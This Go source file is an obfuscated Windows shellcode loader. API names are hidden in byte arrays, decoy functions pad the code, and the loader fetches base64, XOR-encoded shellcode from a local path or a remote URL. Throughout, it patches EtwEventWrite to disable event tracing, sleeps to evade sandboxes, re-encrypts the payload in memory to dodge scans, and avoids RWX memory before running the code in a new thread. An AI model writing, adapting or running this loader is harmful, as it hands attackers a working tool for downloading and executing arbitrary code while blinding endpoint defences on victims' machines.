package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	j7kvu2j5mjf = windows.NewLazySystemDLL(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	yo9c1dpqdkgzo = windows.NewLazySystemDLL(string([]byte{110,116,100,108,108,46,100,108,108}))

	proclrpgxptyv = yo9c1dpqdkgzo.NewProc(string([]byte{82}) + string([]byte{116,108,77,111,118,101,77,101,109,111,114,121}))
)

func cyn67mp() []int {
	s := make([]int, 12)
	for i := range s {
		s[i] = i * 2 + 99
	}
	return s
}

func szwfqk3njvnb6() int {
	x := 0
	for i := 0; i < 16; i++ {
		x += i * 8
	}
	return x
}

func sfo4la7er87rq() bool {
	return 123 > 179
}

func fxczegv6amj() bool {
	return 209 > 211
}

func b17b4mixrph() []int {
	s := make([]int, 16)
	for i := range s {
		s[i] = i * 4 + 81
	}
	return s
}

func nq70ox05myd5() int {
	x := 0
	for i := 0; i < 83; i++ {
		x += i * 2
	}
	return x
}

func itb3gtlyzpyut(err error, msg string) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
		os.Exit(1)
	}
}

func rs6lkeyau() {
	spgc7ywi := yo9c1dpqdkgzo.NewProc(string([]byte{69,116,119,69,118}) + string([]byte{101,110,116,87,114,105}) + string([]byte{116,101}))
	spgc7ywi.Find()
	patch := []byte{0xC3}
	var egyhn1m5n6z uint32
	vp := j7kvu2j5mjf.NewProc(string([]byte{86,105,114,116,117}) + string([]byte{97,108}) + string([]byte{80,114,111,116}) + string([]byte{101,99,116}))
	vp.Call(spgc7ywi.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&egyhn1m5n6z)))
	*(*byte)(unsafe.Pointer(spgc7ywi.Addr())) = patch[0]
	vp.Call(spgc7ywi.Addr(), 1, uintptr(egyhn1m5n6z), uintptr(unsafe.Pointer(&egyhn1m5n6z)))
}

func phws4245zvoz(url string) []byte {
	ex08znh := &http.Client{}
	j80isur6, err := ex08znh.Get(url)
	itb3gtlyzpyut(err, "download failed")
	defer j80isur6.Body.Close()
	data, err := io.ReadAll(j80isur6.Body)
	itb3gtlyzpyut(err, "read failed")
	return data
}

func btboyzf8g6(p string) []byte {
	data, err := os.ReadFile(p)
	itb3gtlyzpyut(err, "load failed")
	return data
}

func ezwwn7o(data []byte) []byte {
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	itb3gtlyzpyut(err, "decode failed")
	if len(decoded) < 2 {
		fmt.Fprintf(os.Stderr, "[!] payload invalid\n")
		os.Exit(1)
	}
	// First byte is XOR key; remaining bytes are XOR-encrypted shellcode.
	xewrfpm4k1x := decoded[0]
	sc := make([]byte, len(decoded)-1)
	for i, b := range decoded[1:] {
		sc[i] = b ^ xewrfpm4k1x
	}
	return sc
}

func r9u11ffrej1ax(aocz7bv2 []byte) {
	rs6lkeyau()

	// Timing jitter — sandbox evasion
	xre17pocmw := time.Duration(rand.Intn(800)+200) * time.Millisecond
	time.Sleep(xre17pocmw)

	// VirtualAlloc PAGE_READWRITE (no RWX signature)
	roac7a2kcm7, err := windows.VirtualAlloc(
		0,
		uintptr(len(aocz7bv2)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	itb3gtlyzpyut(err, "VirtualAlloc failed")

	// Copy shellcode into RW region
	proclrpgxptyv.Call(
		roac7a2kcm7,
		uintptr(unsafe.Pointer(&aocz7bv2[0])),
		uintptr(len(aocz7bv2)),
	)

	// XOR-encrypt shellcode in RW memory while sleeping.
	// Defeats MARS time-based memory scans — no recognisable bytes at rest.
	hurcoasg4 := byte(rand.Intn(254) + 1)
	for i := 0; i < len(aocz7bv2); i++ {
		*(*byte)(unsafe.Pointer(roac7a2kcm7 + uintptr(i))) ^= hurcoasg4
	}
	time.Sleep(time.Duration(rand.Intn(3000)+2000) * time.Millisecond)
	for i := 0; i < len(aocz7bv2); i++ {
		*(*byte)(unsafe.Pointer(roac7a2kcm7 + uintptr(i))) ^= hurcoasg4
	}

	// Flip to RX (execute, no write) — avoids RWX detection
	var egyhn1m5n6z uint32
	vp := j7kvu2j5mjf.NewProc(string([]byte{86,105,114,116,117}) + string([]byte{97,108}) + string([]byte{80,114,111,116}) + string([]byte{101,99,116}))
	vp.Call(roac7a2kcm7, uintptr(len(aocz7bv2)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&egyhn1m5n6z)))

	// CreateThread with 32MB stack + WaitForSingleObject
	om818at, _, err := j7kvu2j5mjf.NewProc(string([]byte{67,114}) + string([]byte{101}) + string([]byte{97,116,101,84,104,114,101,97,100})).Call(0, 33554432, roac7a2kcm7, 0, 0x00010000, 0)
	if om818at == 0 {
		itb3gtlyzpyut(err, "CreateThread failed")
	}
	j7kvu2j5mjf.NewProc(string([]byte{87,97,105,116,70,111,114,83,105}) + string([]byte{110,103,108,101,79,98,106,101,99}) + string([]byte{116})).Call(om818at, 0xFFFFFFFF)
}

func main() {
	v2kd0oi := flag.String("local", "", "Path to local base64-encoded shellcode file")
	mis0eq4ymt := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
	flag.Parse()

	var v0zwy95c []byte

	if *v2kd0oi != "" {
		v0zwy95c = btboyzf8g6(*v2kd0oi)
	} else if *mis0eq4ymt != "" {
		v0zwy95c = phws4245zvoz(*mis0eq4ymt)
	} else {
		fmt.Println("[!] Usage: -local <path> | -remote <url>")
		os.Exit(1)
	}

	f2gmzw9n := ezwwn7o(v0zwy95c)
	fmt.Println("[+] Shellcode decoded. Executing...")
	r9u11ffrej1ax(f2gmzw9n)
}
